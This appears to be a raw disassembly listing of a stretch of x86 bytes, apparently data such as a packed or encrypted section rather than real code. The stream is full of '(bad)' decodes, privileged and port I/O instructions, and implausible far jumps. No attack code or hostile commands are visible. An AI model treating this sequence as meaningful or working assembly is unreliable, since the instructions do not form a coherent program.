  419bec:	pop    eax
  419bed:	push   0xa4274096
  419bf2:	aas    
  419bf3:	and    bl,BYTE PTR [eax]
  419bf5:	mov    ebp,0x36f384a2
  419bfa:	jbe    0x419c59
  419bfc:	fimul  DWORD PTR [esi]
  419bfe:	arpl   WORD PTR [edi+0x35],sp
  419c01:	xchg   DWORD PTR [ebp-0x8],ecx
  419c04:	mov    al,0x32
  419c06:	pop    edi
  419c07:	push   ecx
  419c08:	nop
  419c09:	cdq    
  419c0a:	xchg   DWORD PTR [esi],esp
  419c0c:	pop    esp
  419c0d:	xor    bl,BYTE PTR [esi+edi*8+0x2fe3dc1a]
  419c14:	test   BYTE PTR [edx],ch
  419c16:	sti    
  419c17:	dec    ebx
  419c18:	or     bl,BYTE PTR [ebx-0x54]
  419c1b:	fisub  WORD PTR [ebp+0x18]
  419c1e:	pop    ecx
  419c1f:	pop    esi
  419c20:	cmp    DWORD PTR ss:[eax-0x4],ebx
  419c24:	lahf   
  419c25:	and    eax,0x2fef8389
  419c2a:	jl     0x419ca7
  419c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c2d:	in     al,0x2f
  419c2f:	sbb    DWORD PTR [esi],0x5a
  419c32:	shr    BYTE PTR [edx-0x7c22644],1
  419c38:	xor    al,0xe1
  419c3a:	mov    eax,0xedbe58f2
  419c3f:	pop    ecx
  419c40:	into   
  419c41:	pop    ebx
  419c42:	sub    BYTE PTR [ebp+0x2efb66ec],cl
  419c48:	int    0xc5
  419c4a:	out    dx,al
  419c4b:	add    DWORD PTR [edi+0x79],edi
  419c4e:	mov    esp,DWORD PTR [ecx]
  419c50:	pop    ebx
  419c51:	push   edx
  419c52:	mov    eax,0x3f71fe57
  419c57:	out    0x50,al
  419c59:	out    0x81,al
  419c5b:	gs stos DWORD PTR es:[edi],eax
  419c5d:	jmp    0x59a0:0x48cd3b84
  419c64:	div    DWORD PTR [ebp-0x3f]
  419c67:	fistp  WORD PTR [edx+0xa]
  419c6a:	jb     0x419cd0
  419c6c:	popa   
  419c6d:	add    eax,0x712032b7
  419c72:	scas   eax,DWORD PTR es:[edi]
  419c73:	xchg   ebx,eax
  419c74:	xlat   BYTE PTR ds:[ebx]
  419c75:	out    dx,al
  419c76:	fist   DWORD PTR [esi]
  419c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c79:	mov    bl,dl
  419c7b:	out    0x91,al
  419c7d:	out    dx,al
  419c7e:	jnp    0x419c44
  419c80:	aaa    
  419c81:	pusha  
  419c82:	jl     0x419c53
  419c84:	dec    edi
  419c85:	sub    eax,0x7148430f
  419c8a:	adc    ecx,eax
  419c8c:	(bad)  
  419c8d:	add    cl,BYTE PTR [eax+edx*1]
  419c90:	jbe    0x419c97
  419c92:	inc    esi
  419c93:	mov    eax,ds:0x59860c95
  419c98:	ja     0x419cab
  419c9a:	pop    edx
  419c9b:	pop    ebp
  419c9c:	rcl    DWORD PTR [edi],0x24
  419c9f:	(bad)  
  419ca0:	fcomp  st(4)
  419ca2:	mov    edx,0x7b1b352a
  419ca7:	adc    al,0xab
  419ca9:	fcomp  st(3)
  419cab:	retf   
  419cac:	push   ds
  419cad:	sbb    edi,DWORD PTR [esi]
  419caf:	sbb    cl,BYTE PTR [ecx+0x6cff9810]
  419cb5:	dec    ecx
  419cb6:	popa   
  419cb7:	rcl    DWORD PTR [ecx+0x0],0xbb
  419cbb:	and    eax,0x81a7cf87
  419cc0:	inc    eax
  419cc1:	daa    
  419cc2:	sub    al,0x53
  419cc4:	popa   
  419cc5:	aad    0x4
  419cc7:	jle    0x419cc3
  419cc9:	xlat   BYTE PTR ds:[ebx]
  419cca:	inc    ebp
  419ccb:	loopne 0x419cbf
  419ccd:	mov    ?,WORD PTR [ebx]
  419ccf:	loop   0x419d09
  419cd1:	push   0x99ccf198
  419cd6:	sbb    eax,0xdff0e878
  419cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cdc:	aam    0x6
  419cde:	js     0x419d40
  419ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce1:	cwde   
  419ce2:	dec    ebx
  419ce3:	mov    WORD PTR [eax+0x7],ds
  419ce6:	shl    BYTE PTR [ecx+0x46ee9f2d],cl
  419cec:	iret   
  419ced:	xchg   edx,eax
  419cee:	ret    
  419cef:	nop
  419cf0:	(bad)  
  419cf1:	mov    ecx,0xcedb29a7
  419cf6:	mov    ss,eax
  419cf8:	inc    eax
  419cf9:	rol    ecx,1
  419cfb:	daa    
  419cfc:	and    eax,0x8a31a2be
  419d01:	mov    ah,0x89
  419d03:	hlt    
  419d04:	shl    DWORD PTR [ecx-0x6d],0x26
  419d08:	pushf  
  419d09:	and    bl,ch
  419d0b:	neg    BYTE PTR [edx-0x4d]
  419d0e:	push   0x32
  419d10:	leave  
  419d11:	sub    eax,0xa2538e5e
  419d16:	js     0x419d23
  419d18:	adc    BYTE PTR [edx+0x38627dc3],cl
  419d1e:	xchg   ecx,eax
  419d1f:	fnstcw WORD PTR [eax-0x621548cd]
  419d25:	jnp    0x419cb9
  419d27:	mov    DWORD PTR [ecx-0x6],esp
  419d2a:	imul   DWORD PTR ds:0x9aa1c13c
  419d30:	cmp    al,BYTE PTR [esi+0x73482dc9]
  419d36:	gs jle 0x419d8f
  419d39:	aad    0xc2
  419d3b:	push   ebx
  419d3c:	sub    al,ch
  419d3e:	pop    ebp
  419d3f:	mov    cl,0xf4
  419d41:	pop    eax
  419d42:	rcr    BYTE PTR [ecx-0x48],cl
  419d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d46:	dec    ecx
  419d47:	shr    BYTE PTR es:[edi+ecx*4+0x53],0xe5
  419d4d:	jo     0x419cdd
  419d4f:	fisub  WORD PTR [edi-0x61]
  419d52:	gs sbb al,0xab
  419d55:	pop    esp
  419d56:	pop    es
  419d57:	sub    eax,0x7a96131d
  419d5c:	inc    edx
  419d5d:	add    bh,BYTE PTR ds:0x24369a90
  419d63:	int3   
  419d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d65:	inc    esi
  419d66:	push   esi
  419d67:	mov    dh,0xd1
  419d69:	adc    eax,esi
  419d6b:	cmp    ah,BYTE PTR [ecx+0x44d0b78d]
  419d71:	or     DWORD PTR [eax-0x4345ee0c],0xffffff99
  419d78:	xor    dl,bh
  419d7a:	ins    DWORD PTR es:[edi],dx
  419d7b:	gs in  al,0xe2
  419d7e:	cdq    
  419d7f:	cld    
  419d80:	out    0xb6,al
  419d82:	mov    bl,0x3
  419d84:	shl    DWORD PTR [ebx],0x3d
  419d87:	arpl   WORD PTR [ecx-0x1f],bp
  419d8a:	mov    ebp,0x17e0d137
  419d8f:	adc    eax,0xe66936b2
  419d94:	adc    ebx,DWORD PTR [ebp-0x420585b6]
  419d9a:	mov    eax,DWORD PTR [ebx-0x2d3a25bf]
  419da0:	jo     0x419dcc
  419da2:	mov    BYTE PTR [edx],cl
  419da4:	xchg   ebx,eax
  419da5:	outs   dx,BYTE PTR ds:[esi]
  419da6:	inc    esp
  419da7:	mov    cl,BYTE PTR [ebp+0x5b]
  419daa:	push   eax
  419dab:	mov    dh,0x9c
  419dad:	pop    edi
  419dae:	iret   
  419daf:	xor    DWORD PTR [edi+0x74],ecx
  419db2:	mov    ss,ecx
  419db4:	in     al,0xc8
  419db6:	mov    al,ds:0xca350a
  419dbb:	gs inc esi
  419dbd:	arpl   WORD PTR [edi],cx
  419dbf:	sub    DWORD PTR [esp+edx*8],ebp
  419dc2:	out    dx,al
  419dc3:	rol    DWORD PTR [ebp+0x1593a5ab],1
  419dc9:	ds dec edx
  419dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dcc:	std    
  419dcd:	iret   
  419dce:	int3   
  419dcf:	inc    ecx
  419dd0:	mov    bh,0x3c
  419dd2:	fimul  WORD PTR [ebx+0x15e98356]
  419dd8:	adc    eax,0xb19c92ce
  419ddd:	push   ecx
  419dde:	addr16 clc 
  419de0:	dec    ecx
  419de1:	sbb    cl,BYTE PTR [ebx]
  419de3:	repnz sbb ecx,DWORD PTR [edi-0x42c88f84]
  419dea:	std    
  419deb:	inc    ebx
  419dec:	out    dx,al
  419ded:	mov    al,ds:0xd2f27ec4
  419df2:	stos   DWORD PTR es:[edi],eax
  419df3:	mov    ah,0x6a
  419df5:	fisub  DWORD PTR [esp+ebp*8]
  419df8:	xchg   edx,eax
  419df9:	sar    dl,cl
  419dfb:	adc    eax,0x50e35768
  419e00:	jg     0x419dbd
  419e02:	fnstenv [eax]
  419e04:	mov    edi,0x3016927f
  419e09:	jo     0x419dd9
  419e0b:	pop    es
  419e0c:	call   0x82d17cfb
  419e11:	arpl   sp,bp
  419e13:	xor    al,0x66
  419e15:	sbb    BYTE PTR [ebx-0x1f],dl
  419e18:	sbb    DWORD PTR [ebx+0x23],eax
  419e1b:	cmc    
  419e1c:	mov    esi,0xc8c76a35
  419e21:	push   cs
  419e22:	mov    bl,0x7a
  419e24:	les    esi,FWORD PTR [edx+0x35]
  419e27:	std    
  419e28:	sub    bh,BYTE PTR [ecx+0x22]
  419e2b:	in     eax,0xf
  419e2d:	lds    ecx,FWORD PTR [edx]
  419e2f:	inc    ebx
  419e30:	bound  ebx,QWORD PTR [edx]
  419e32:	icebp  
  419e33:	sub    BYTE PTR [edx+edi*8],dl
  419e36:	inc    ebx
  419e37:	iret   
  419e38:	cs loope 0x419e80
  419e3b:	stos   DWORD PTR es:[edi],eax
  419e3c:	and    DWORD PTR [edx],ebx
  419e3e:	mov    dh,0x8c
  419e40:	pop    edx
  419e41:	imul   ebx,edi,0x71b5bd67
  419e47:	mov    ebp,DWORD PTR [eax+0x55]
  419e4a:	dec    esi
  419e4b:	cmp    al,0x60
  419e4d:	rcl    esi,cl
  419e4f:	test   al,0x8b
  419e51:	sub    dh,BYTE PTR [ebp-0x43]
  419e54:	or     BYTE PTR [esi+0x20ecea0c],0xb5
  419e5b:	jmp    0x76937794
  419e60:	cwde   
  419e61:	aas    
  419e62:	mov    bl,0xce
  419e64:	shl    BYTE PTR [eax],1
  419e66:	outs   dx,BYTE PTR ds:[esi]
  419e67:	les    edi,FWORD PTR [edi+0x29]
  419e6a:	xchg   esi,eax
  419e6b:	sbb    bh,BYTE PTR [ecx]
  419e6d:	push   esp
  419e6e:	push   edx
  419e6f:	jns    0x419e48
  419e71:	inc    edx
  419e72:	lds    esi,FWORD PTR [ebx]
  419e74:	cmp    al,0x27
  419e76:	std    
  419e77:	dec    ebx
  419e78:	xor    bh,BYTE PTR [esp]
  419e7b:	xchg   ecx,eax
  419e7c:	int3   
  419e7d:	mov    esi,0x208cf755
  419e82:	jmp    0x419e5e
  419e84:	sbb    eax,0x933d046
  419e89:	in     eax,dx
  419e8a:	imul   ecx,DWORD PTR [ecx-0x3ba94582],0x1469ef7e
  419e94:	xor    bh,BYTE PTR ds:0x5c46017e
  419e9a:	lea    ecx,[ecx]
  419e9c:	rol    DWORD PTR [eax-0x79f6955],cl
  419ea2:	push   ebx
  419ea3:	into   
  419ea4:	wrmsr  
  419ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ea7:	sub    ebp,DWORD PTR [edi+0x36]
  419eaa:	and    BYTE PTR [ecx+0x5a],dh
  419ead:	les    ebx,FWORD PTR [edx-0x2f]
  419eb0:	jge    0x419e4c
  419eb2:	or     eax,0x7bec4663
  419eb7:	xchg   ecx,eax
  419eb8:	inc    ebx
  419eb9:	jp     0x419ec4
  419ebb:	(bad)  
  419ebc:	sbb    bh,BYTE PTR [ebx-0x68]
  419ebf:	fnop   
  419ec1:	jecxz  0x419eec
  419ec3:	sbb    ebp,DWORD PTR [ebp+0x18]
  419ec6:	cdq    
  419ec7:	ret    
  419ec8:	sbb    al,0xf8
  419eca:	out    dx,eax
  419ecb:	cmp    al,ah
  419ecd:	pusha  
  419ece:	push   cs
  419ecf:	push   ds
  419ed0:	mov    edx,0x8f3d68c
  419ed5:	je     0x419f23
  419ed7:	in     eax,0x10
  419ed9:	loope  0x419ec7
  419edb:	mov    BYTE PTR [eax+0x295b4de7],dl
  419ee1:	je     0x419ede
  419ee3:	stos   DWORD PTR es:[edi],eax
  419ee4:	cdq    
  419ee5:	mov    ah,0x65
  419ee7:	dec    ebx
  419ee8:	and    DWORD PTR [edi-0x28],eax
  419eeb:	int3   
  419eec:	adc    bh,cl
  419eee:	xor    eax,0xe82c5c56
  419ef3:	mov    ecx,DWORD PTR [eax+0x717d5866]
  419ef9:	jge    0x419f15
  419efb:	outs   dx,DWORD PTR ds:[esi]
  419efc:	inc    ecx
  419efd:	mov    eax,0xea4eafb5
  419f02:	push   edi
  419f03:	push   ds
  419f04:	adc    BYTE PTR [ecx-0x1bdb81],0x2e
  419f0b:	mov    dl,0xb6
  419f0d:	mov    dh,0xe1
  419f0f:	cmp    al,0x42
  419f11:	loope  0x419f75
  419f13:	add    BYTE PTR [edx-0x45],bl
  419f16:	int3   
  419f17:	sub    al,0xcc
  419f19:	retf   0x8887
  419f1c:	stos   DWORD PTR es:[edi],eax
  419f1d:	popf   
  419f1e:	popa   
  419f1f:	xor    BYTE PTR [ebx],ch
  419f21:	or     dl,dl
  419f23:	icebp  
  419f24:	push   edx
  419f25:	retf   0x1bb
  419f28:	mov    esp,0x7310c0d1
  419f2d:	add    eax,0x9222b44c
  419f32:	ss fwait
  419f34:	inc    esi
  419f35:	mov    cl,0x71
  419f37:	push   0xffffffea
  419f39:	sub    esp,DWORD PTR [ebx+0x18]
  419f3c:	idiv   edi
  419f3e:	dec    ecx
  419f3f:	fwait
  419f40:	and    bl,al
  419f42:	cmp    dl,BYTE PTR [edx+0x6a]
  419f45:	sub    eax,0x57fe26fd
  419f4a:	or     al,0x8d
  419f4c:	lea    ebx,[edi]
  419f4e:	shl    BYTE PTR [eax],1
  419f50:	shl    DWORD PTR [edi+0x4f],0x45
  419f54:	push   ecx
  419f55:	daa    
  419f56:	sti    
  419f57:	cwde   
  419f58:	call   0x424:0x79fa528
  419f5f:	lods   eax,DWORD PTR ds:[esi]
  419f60:	mov    cl,0x69
  419f62:	cmc    
  419f63:	push   ss
  419f64:	jmp    0x58e0:0xba981fee
  419f6b:	cmc    
  419f6c:	cmc    
  419f6d:	push   edx
  419f6e:	and    al,BYTE PTR ss:[eax-0x3a]
  419f72:	sbb    al,0x8c
  419f74:	rcr    BYTE PTR [edx+0x73],0x75
  419f78:	pop    esi
  419f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f7a:	mov    ah,0x59
  419f7c:	push   ss
  419f7d:	adc    esi,DWORD PTR [ebx]
  419f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f80:	add    BYTE PTR [ecx-0x4a6bdebc],bh
  419f86:	fucom  st(3)
  419f88:	ret    
  419f89:	mov    ah,0x33
  419f8b:	or     cl,BYTE PTR [ecx]
  419f8d:	dec    esi
  419f8e:	xor    ecx,DWORD PTR [edx-0x21]
  419f91:	daa    
  419f92:	mov    ch,0xf0
  419f94:	bound  edi,QWORD PTR [edi]
  419f96:	sbb    DWORD PTR [eax-0xa96ca5b],0x7fab9c77
  419fa0:	mov    ch,0xe8
  419fa2:	pop    ebp
  419fa3:	fcomp  DWORD PTR [edx+0xc4d81ed]
  419fa9:	(bad)  [eax]
  419fab:	lods   al,BYTE PTR ds:[esi]
  419fac:	xchg   ebx,eax
  419fad:	cmp    bl,dh
  419faf:	mov    eax,DWORD PTR [edi+0x73]
  419fb2:	loopne 0x41a011
  419fb4:	jae    0x419f4a
  419fb6:	lods   eax,DWORD PTR ds:[esi]
  419fb7:	loope  0x419f7a
  419fb9:	or     DWORD PTR [edi-0x3f],edi
  419fbc:	dec    esp
  419fbd:	jb     0x41a01b
  419fbf:	popa   
  419fc0:	inc    eax
  419fc1:	js     0x41a018
  419fc3:	pop    esi
  419fc4:	int    0x4a
  419fc6:	mov    esi,0xe4603eaf
  419fcb:	aas    
  419fcc:	shr    DWORD PTR [eax-0x70024584],0x36
  419fd3:	sahf   
  419fd4:	repz push ss
  419fd6:	push   esp
  419fd7:	cmp    edi,ecx
  419fd9:	pop    eax
  419fda:	stos   DWORD PTR es:[edi],eax
  419fdb:	cmp    edi,DWORD PTR [edi+0x26]
  419fde:	sub    esi,DWORD PTR [eax+0x2f]
  419fe1:	shl    DWORD PTR [edi],cl
  419fe3:	or     al,0xe8
  419fe5:	imul   eax,DWORD PTR [ecx+0x73],0xffffffca
  419fe9:	lea    esi,[edi+0x4c]
  419fec:	mov    ds:0x71bff9fa,eax
  419ff1:	mov    al,0x4f
  419ff3:	int    0x5c
  419ff5:	push   ss
  419ff6:	scas   al,BYTE PTR es:[edi]
  419ff7:	mov    al,0xdb
  419ff9:	aaa    
  419ffa:	xchg   ebx,eax
  419ffb:	lahf   
  419ffc:	pusha  
  419ffd:	add    DWORD PTR [edx-0x6b],edx
  41a000:	aas    
  41a001:	mov    ah,0xfb
  41a003:	mov    ?,WORD PTR [ecx]
  41a005:	ret    0xc78e
  41a008:	call   0x1dfa:0x9a3fae9a
  41a00f:	and    eax,0x13e221b1
  41a014:	enter  0x344,0x15
  41a018:	test   DWORD PTR [eax-0x7316e2ac],ebx
  41a01e:	cmc    
  41a01f:	cs test eax,0x34f1360c
  41a025:	xor    eax,0xbc69f3b1
  41a02a:	fstp   DWORD PTR [esi]
  41a02c:	dec    eax
  41a02d:	dec    esp
  41a02e:	jns    0x41a034
  41a030:	inc    edx
  41a031:	pop    ss
  41a032:	mov    ss,WORD PTR [eax-0x298d323a]
  41a038:	pop    edx
  41a039:	jno    0x419fea
  41a03b:	sbb    ecx,edx
  41a03d:	mov    gs,WORD PTR [esi-0x5f52f342]
  41a043:	clc    
  41a044:	xchg   ebp,eax
  41a045:	ds test eax,0xd8cec266
  41a04b:	inc    ebp
  41a04c:	popf   
  41a04d:	push   ss
  41a04e:	retf   0xa63
  41a051:	jbe    0x419fda
  41a053:	push   DWORD PTR [esi-0x62b5e7a1]
  41a059:	stos   DWORD PTR es:[edi],eax
  41a05a:	add    edi,ecx
  41a05c:	add    esp,ecx
  41a05e:	aam    0x92
  41a060:	adc    al,0x75
  41a062:	xchg   esi,eax
  41a063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a064:	add    DWORD PTR [edi],esi
  41a066:	xchg   esp,eax
  41a067:	pop    esp
  41a068:	fcom   DWORD PTR [eax-0x90c2c05]
  41a06e:	pop    edi
  41a06f:	mov    DWORD PTR [ebx+0x2f9091c1],edx
  41a075:	dec    edi
  41a076:	push   es
  41a077:	aaa    
  41a078:	mov    eax,ds:0x319a098e
  41a07d:	(bad)  
  41a07e:	mov    edi,0x748cfbc1
  41a083:	aam    0xdc
  41a085:	lahf   
  41a086:	loopne 0x41a01a
  41a088:	mov    BYTE PTR [edi-0x354c4b7c],bl
  41a08e:	std    
  41a08f:	add    eax,0x6db09831
  41a094:	xor    bh,BYTE PTR [edi+0x41]
  41a097:	push   ss
  41a098:	(bad)  
  41a09a:	sar    BYTE PTR [eax-0x7ee9e4e],0xd8
  41a0a1:	sahf   
  41a0a2:	pop    esi
  41a0a3:	jo     0x41a06e
  41a0a5:	fisubr WORD PTR [esp+edx*4+0x7e]
  41a0a9:	cmp    ch,BYTE PTR [edx]
  41a0ab:	nop
  41a0ac:	cld    
  41a0ad:	sub    BYTE PTR ds:0x963e9fd9,0x26
  41a0b4:	dec    ebx
  41a0b5:	ffree  st(0)
  41a0b7:	icebp  
  41a0b8:	mov    eax,ds:0xf94f743a
  41a0bd:	frstor [eax+0x4d6369bc]
  41a0c3:	cdq    
  41a0c4:	add    al,0xf
  41a0c6:	jge    0x41a05c
  41a0c8:	pushf  
  41a0c9:	mov    al,ds:0x4bc593d6
  41a0ce:	cs aam 0x28
  41a0d1:	loopne 0x41a0af
  41a0d3:	dec    ebp
  41a0d4:	xor    DWORD PTR [esi],0xbc390401
  41a0da:	lea    eax,[edi+0xf8eebe3]
  41a0e0:	ins    BYTE PTR es:[edi],dx
  41a0e1:	push   es
  41a0e2:	mov    edx,0x1cd26d40
  41a0e7:	xor    esp,DWORD PTR [edi+0xf7c03e5]
  41a0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ee:	jecxz  0x41a106
  41a0f0:	gs push ds
  41a0f2:	mov    dl,0x83
  41a0f4:	(bad)  
  41a0f5:	popa   
  41a0f6:	loop   0x41a0a4
  41a0f8:	mov    al,0xf2
  41a0fa:	gs stos DWORD PTR es:[edi],eax
  41a0fc:	fcomp  QWORD PTR [ecx+0x39]
  41a0ff:	aas    
  41a100:	dec    edi
  41a101:	ror    ebx,1
  41a103:	xchg   esi,eax
  41a104:	popf   
  41a105:	ss mov edx,0x1fccca56
  41a10b:	sub    ebp,edi
  41a10d:	dec    ebx
  41a10e:	aam    0x4a
  41a110:	ret    0x4646
  41a113:	jne    0x41a14b
  41a115:	xchg   edx,eax
  41a116:	mov    dl,0xfe
  41a118:	ret    
  41a119:	xchg   esi,eax
  41a11a:	xchg   edx,eax
  41a11b:	mov    cl,0x8b
  41a11d:	pushf  
  41a11e:	rol    BYTE PTR [ecx-0x6c13f03c],cl
  41a124:	push   ss
  41a125:	sbb    eax,DWORD PTR [ebx-0x44c3b31f]
  41a12b:	ficom  WORD PTR [ecx+0x68]
  41a12e:	rcr    cl,1
  41a130:	scas   eax,DWORD PTR es:[edi]
  41a131:	fld    DWORD PTR [ebx+0x32]
  41a134:	sub    eax,0xaf65fadc
  41a139:	or     esp,DWORD PTR ds:0x4dca0255
  41a13f:	dec    BYTE PTR [ebp+0x3d743c3e]
  41a145:	add    edi,DWORD PTR [eax-0x6c]
  41a148:	mov    al,0x26
  41a14a:	adc    BYTE PTR [edi-0x109b7b17],bl
  41a150:	cs xchg esi,eax
  41a152:	or     ecx,edx
  41a154:	call   0x1000:0x8d3dc9d0
  41a15b:	push   edi
  41a15c:	mov    esi,0xf131bba0
  41a161:	je     0x41a123
  41a163:	les    ebp,FWORD PTR [ecx-0x78c25327]
  41a169:	test   al,0x95
  41a16b:	push   edi
  41a16c:	push   ebx
  41a16d:	popa   
  41a16e:	ins    BYTE PTR es:[edi],dx
  41a16f:	xor    DWORD PTR [ebx-0x30],ebx
  41a172:	or     eax,0x9cdf84a4
  41a177:	xor    BYTE PTR [edi+0x48],0x66
  41a17b:	xor    cl,0x97
  41a17e:	int    0xfd
  41a180:	jbe    0x41a16d
  41a182:	pop    eax
  41a183:	int3   
  41a184:	lock aaa 
  41a186:	test   eax,0x79121592
  41a18b:	arpl   WORD PTR ds:0xf85a892d,ax
  41a191:	stc    
  41a192:	js     0x41a1bf
  41a194:	repz inc esi
  41a196:	adc    BYTE PTR [edi+0x6631dd6e],dh
  41a19c:	stc    
  41a19d:	dec    DWORD PTR [edi]
  41a19f:	(bad)  [edx+0x4ae24c22]
  41a1a5:	das    
  41a1a6:	mov    ch,0x3b
  41a1a8:	retf   
  41a1a9:	mov    ah,0x1b
  41a1ab:	mov    edi,0xd9e3f2b6
  41a1b0:	leave  
  41a1b1:	(bad)  
  41a1b2:	cmc    
  41a1b3:	xor    esp,edi
  41a1b5:	test   BYTE PTR [eax-0x6c0ef512],cl
  41a1bb:	mov    dh,BYTE PTR [edi]
  41a1bd:	(bad)  
  41a1be:	jmp    0x8d3dbc84
  41a1c3:	jae    0x41a192
  41a1c5:	dec    ecx
  41a1c6:	fwait
  41a1c7:	mov    bh,0x31
  41a1c9:	jle    0x41a158
  41a1cb:	dec    ecx
  41a1cc:	and    BYTE PTR [ebx+0x77],dl
  41a1cf:	push   ds
  41a1d0:	loopne 0x41a19a
  41a1d2:	jb     0x41a230
  41a1d4:	push   0xffffffcd
  41a1d6:	cmp    al,0x9
  41a1d8:	stos   BYTE PTR es:[edi],al
  41a1d9:	(bad)  
  41a1da:	mov    ds:0xc393e0fe,eax
  41a1df:	xchg   edx,eax
  41a1e0:	xchg   esi,eax
  41a1e1:	les    edi,FWORD PTR [edx-0x47]
  41a1e4:	ins    DWORD PTR es:[edi],dx
  41a1e5:	xchg   edi,eax
  41a1e6:	sub    edi,0x2d
  41a1e9:	push   edx
  41a1ea:	xor    BYTE PTR [esi+ebp*8+0x46c76ac8],al
  41a1f1:	loope  0x41a232
  41a1f3:	mov    ecx,0x70ecd885
  41a1f8:	js     0x41a1a8
  41a1fa:	add    al,0x35
  41a1fc:	push   esp
  41a1fd:	in     eax,dx
  41a1fe:	push   es
  41a1ff:	inc    eax
  41a200:	pop    ds
  41a201:	push   0x75952c0a
  41a206:	mov    ds,ebx
  41a208:	sbb    al,0xed
  41a20a:	mov    eax,ds:0xc8a1a861
  41a20f:	cs in  al,dx
  41a211:	inc    ecx
  41a212:	int3   
  41a213:	jb     0x41a1dd
  41a215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a216:	push   ss
  41a217:	(bad)  
  41a218:	fldcw  WORD PTR [edi-0x634f4aa0]
  41a21e:	lea    esp,[ecx-0x6b573525]
  41a224:	jmp    0x198e:0x603d45b2
  41a22b:	lods   al,BYTE PTR ds:[esi]
  41a22c:	not    BYTE PTR [edi-0x21939e65]
  41a232:	das    
  41a233:	jae    0x41a212
  41a235:	pop    ds
  41a236:	pusha  
  41a237:	add    bh,bh
  41a239:	out    dx,eax
  41a23a:	adc    DWORD PTR [edi],ebp
  41a23c:	mov    edi,0x62634ea1
  41a241:	cwde   
  41a242:	pop    ebx
  41a243:	aas    
  41a244:	fmul   st(3),st
  41a246:	enter  0x2e6a,0xe1
  41a24a:	retf   0x5fe5
  41a24d:	xchg   ebp,eax
  41a24e:	lods   eax,DWORD PTR ds:[esi]
  41a24f:	imul   esi,eax,0x33
  41a252:	js     0x41a285
  41a254:	mov    ds:0xfd872629,eax
  41a259:	xor    ebx,DWORD PTR [ecx]
  41a25b:	jg     0x41a287
  41a25d:	push   edi
  41a25e:	push   ecx
  41a25f:	pop    es
  41a260:	popa   
  41a261:	je     0x41a231
  41a263:	jge    0x41a265
  41a265:	shl    bh,1
  41a267:	mov    ch,0x2a
  41a269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a26a:	dec    ebp
  41a26b:	sub    al,0xd2
  41a26d:	fild   WORD PTR [esp+eax*8+0x72]
  41a271:	adc    BYTE PTR [ecx],dh
  41a273:	jmp    0xd86a12bf
  41a278:	lock jne 0x41a27f
  41a27b:	inc    ebx
  41a27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a27d:	not    DWORD PTR [edi-0x15]
  41a280:	shr    BYTE PTR [esi-0xa],1
  41a283:	pusha  
  41a284:	int    0xed
  41a286:	pusha  
  41a287:	lods   eax,DWORD PTR ds:[esi]
  41a288:	lahf   
  41a289:	imul   ebx,DWORD PTR [edx+ebx*1-0x70],0x5e688a2f
  41a291:	sbb    esp,ecx
  41a293:	mov    eax,ds:0xb763f182
  41a298:	mov    dl,0xab
  41a29a:	push   ds
  41a29b:	aad    0x8b
  41a29d:	test   eax,0x8c5a1dc
  41a2a2:	mov    esp,0x74b70b20
  41a2a7:	out    0x72,al
  41a2a9:	fisub  WORD PTR [edx]
  41a2ab:	lahf   
  41a2ac:	pop    edx
  41a2ad:	sbb    bl,bh
  41a2af:	loopne 0x41a256
  41a2b1:	xor    BYTE PTR [esi+0x3b5be356],bh
  41a2b7:	mov    edx,0xd2fff244
  41a2bc:	sbb    eax,0xee8a3e3e
  41a2c1:	or     bh,BYTE PTR [ebx+0x7339b2fd]
  41a2c7:	push   edx
  41a2c8:	les    esi,FWORD PTR [ecx+eiz*1+0x3b]
  41a2cc:	retf   0xf3f0
  41a2cf:	and    eax,0xc99e25ef
  41a2d4:	push   0x716bc9d5
  41a2d9:	clc    
  41a2da:	cmp    BYTE PTR [edi+0x45],0x1e
  41a2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2df:	test   DWORD PTR [ecx-0x17813f05],eax
  41a2e5:	bound  ebx,QWORD PTR [eax-0x6d0caf24]
  41a2eb:	(bad)  [eax-0x8c1c688]
  41a2f1:	stos   DWORD PTR es:[edi],eax
  41a2f2:	lahf   
  41a2f3:	push   esp
  41a2f4:	in     al,dx
  41a2f5:	and    bl,BYTE PTR [edi+0x4b06d434]
  41a2fb:	outs   dx,DWORD PTR ds:[esi]
  41a2fc:	pop    ebp
  41a2fd:	dec    ecx
  41a2fe:	sahf   
  41a2ff:	scas   al,BYTE PTR es:[edi]
  41a300:	and    DWORD PTR [esi+0x260d992d],ebx
  41a306:	fstp   QWORD PTR [ecx]
  41a308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a309:	icebp  
  41a30a:	retf   
  41a30b:	push   0xc6329479
  41a310:	idiv   dh
  41a312:	inc    ebp
  41a313:	outs   dx,BYTE PTR ds:[esi]
  41a314:	aad    0x61
  41a316:	out    dx,eax
  41a317:	cmp    eax,0xfe428793
  41a31c:	loopne 0x41a351
  41a31e:	das    
  41a31f:	pop    edx
  41a320:	popf   
  41a321:	xchg   ebx,eax
  41a322:	icebp  
  41a323:	mov    WORD PTR [esi+edi*4+0x62b4577d],cs
  41a32a:	ror    esp,cl
  41a32c:	(bad)  
  41a32e:	dec    ebx
  41a32f:	inc    edx
  41a330:	sbb    ebx,DWORD PTR [esi+0x3f2d3a76]
  41a336:	cli    
  41a337:	pop    edx
  41a338:	inc    ebx
  41a339:	pop    ecx
  41a33a:	jg     0x41a331
  41a33c:	adc    ch,BYTE PTR [esi-0x72]
  41a33f:	lahf   
  41a340:	addr16 std 
  41a342:	and    ch,BYTE PTR [esi-0x6]
  41a345:	add    DWORD PTR [ecx],ebx
  41a347:	sub    eax,edi
